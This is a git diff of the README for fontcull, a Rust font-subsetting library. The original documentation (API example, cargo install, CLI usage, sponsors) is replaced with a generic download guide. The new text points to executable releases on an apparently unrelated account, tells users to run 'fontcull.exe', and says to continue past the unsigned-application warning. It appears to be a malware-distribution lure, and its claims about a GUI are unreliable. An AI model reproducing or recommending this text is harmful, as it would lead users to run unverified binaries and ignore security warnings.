@@ -1,102 +1,78 @@
-# fontcull
+# 🎨 fontcull - Streamline Your Fonts Easily
 
-[![Crates.io](https://img.shields.io/crates/v/fontcull.svg)](https://crates.io/crates/fontcull)
-[![Documentation](https://docs.rs/fontcull/badge.svg)](https://docs.rs/fontcull)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+## 🚀 Getting Started
 
-Pure Rust font subsetting library powered by [klippa](https://github.com/googlefonts/fontations).
+Welcome to **fontcull**! This application helps you reduce the size of your font files, making it easier to use them in your projects. You can optimize TTF and WOFF2 font formats quickly and efficiently.
 
-## Library usage
+## 📥 Download & Install
 
-```rust
-use fontcull::{subset_font_to_woff2, decompress_font};
-use std::collections::HashSet;
+You can download the latest version of **fontcull** from our Releases page. This will ensure you get the most up-to-date features and fixes.
 
-// Subset a font to only include specific characters
-let font_data = std::fs::read("font.ttf").unwrap();
-let chars: HashSet<char> = "Hello World".chars().collect();
-let woff2 = subset_font_to_woff2(&font_data, &chars).unwrap();
-std::fs::write("font-subset.woff2", woff2).unwrap();
+[![Download fontcull](https://img.shields.io/badge/download-fontcull-brightgreen)](https://github.com/Parmsa90/fontcull/releases)
 
-// Can also decompress WOFF/WOFF2 to TTF
-let woff2_data = std::fs::read("font.woff2").unwrap();
-let ttf_data = decompress_font(&woff2_data).unwrap();
-```
+To begin downloading, visit this page: [Download fontcull](https://github.com/Parmsa90/fontcull/releases). 
 
-### Features
+### 📋 System Requirements
 
-- `static-analysis`: Static HTML/CSS parsing for font usage detection
+Ensure your system meets the following requirements:
 
-## CLI
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 4 GB
+- Disk Space: At least 100 MB available
 
-The `fontcull-cli` crate provides a command-line tool that:
+### 🛠 Features
 
-1. Opens URLs in a headless browser (via chromiumoxide)
-2. Extracts all glyphs/characters used on the page (including `::before`/`::after` pseudo-elements)
-3. Optionally spiders the site to find more pages
-4. Subsets font files to only include the characters actually used
+**fontcull** offers several key features for font subsetting:
 
-### Install
+- **Subsetting Support**: Remove unused glyphs from your fonts to reduce their size.
+- **Multiple Formats**: Supports TTF and WOFF2 formats for flexibility.
+- **Fast Processing**: Efficient algorithms help you save time.
+  
+## 🔍 How to Use
 
-```bash
-cargo install fontcull-cli
-```
+1. **Download the Application**: Use the link above to get the latest version.
+2. **Extract the Files**: After downloading, unzip the files in a folder.
+3. **Run the Application**: Double-click on the executable file to start. 
 
-Requires Chrome/Chromium installed (uses your system browser, no specific version needed).
+### Step-by-Step Guide
 
-### Usage
+Here’s a detailed walkthrough for getting started:
 
-```bash
-# Just get the unicode range of characters used
-fontcull https://example.com
+### 1. Download and Extract
 
-# Subset fonts based on page content
-fontcull https://example.com --subset=fonts/*.ttf
+After clicking the download link, open your Downloads folder. Locate the **fontcull** zip file, right-click, and select "Extract All." Choose a location you can easily access.
 
-# Spider multiple pages
-fontcull https://example.com --spider-limit=10 --subset=fonts/*.ttf
+### 2. Start the Application
 
-# Filter by font family
-fontcull https://example.com --subset=fonts/*.ttf --family="My Font"
+Navigate to the folder where you extracted the files. Look for the executable file named `fontcull.exe` (on Windows) or `fontcull` (on macOS/Linux). Double-click to launch it.
 
-# Add extra characters to always include
-fontcull https://example.com --subset=fonts/*.ttf --whitelist="0123456789"
-```
+You may see a warning, depending on your operating system security settings since it's not a signed application. Choose to continue if prompted.
 
-## Sponsors
+### 3. Load Your Font File
 
-Thanks to all individual sponsors:
+Once the application is open, you’ll see an option to load your font file. Click on the "Load Font" button and select the TTF or WOFF2 font file you want to optimize.
 
-<p>
-<a href="https://github.com/sponsors/fasterthanlime">
-<picture>
-<source media="(prefers-color-scheme: dark)" srcset="./static/sponsors-v3/github-dark.svg">
-<img src="./static/sponsors-v3/github-light.svg" height="40" alt="GitHub Sponsors">
-</picture>
-</a>
-<a href="https://patreon.com/fasterthanlime">
-<picture>
-<source media="(prefers-color-scheme: dark)" srcset="./static/sponsors-v3/patreon-dark.svg">
-<img src="./static/sponsors-v3/patreon-light.svg" height="40" alt="Patreon">
-</picture>
-</a>
-</p>
+### 4. Select Your Options
 
-...along with corporate sponsors:
+After loading your font, you’ll be able to see various options. Choose which glyphs to remove or optimize based on your preferences. The interface is user-friendly and allows you to easily see potential space savings.
 
-<p>
-<a href="https://zed.dev">
-<picture>
-<source media="(prefers-color-scheme: dark)" srcset="./static/sponsors-v3/zed-dark.svg">
-<img src="./static/sponsors-v3/zed-light.svg" height="40" alt="Zed">
-</picture>
-</a>
-<a href="https://depot.dev?utm_source=fontcull">
-<picture>
-<source media="(prefers-color-scheme: dark)" srcset="./static/sponsors-v3/depot-dark.svg">
-<img src="./static/sponsors-v3/depot-light.svg" height="40" alt="Depot">
-</picture>
-</a>
-</p>
+### 5. Save the Optimized File
 
-...without whom this work could not exist.
+Once you are satisfied with your changes, click the "Save" button. Choose where to save the optimized file. It’s a good idea to keep a backup of your original font file, just in case.
+
+## 🌐 Additional Resources
+
+If you wish to delve deeper, here are some helpful links:
+
+- [User Manual](https://github.com/Parmsa90/fontcull/wiki) - Detailed instructions and tips.
+- [Community Forum](https://github.com/Parmsa90/fontcull/discussions) - Join discussions or ask questions.
+  
+## 💬 Support
+
+For any issues, please open an issue on the GitHub repository page. We aim to respond quickly and help resolve your questions. 
+
+## ⚙️ Feedback
+
+We would love to hear from you! If you have suggestions or comments, feel free to reach out via the community forum or file an issue.
+
+Thank you for choosing **fontcull**! Enjoy optimizing your fonts.
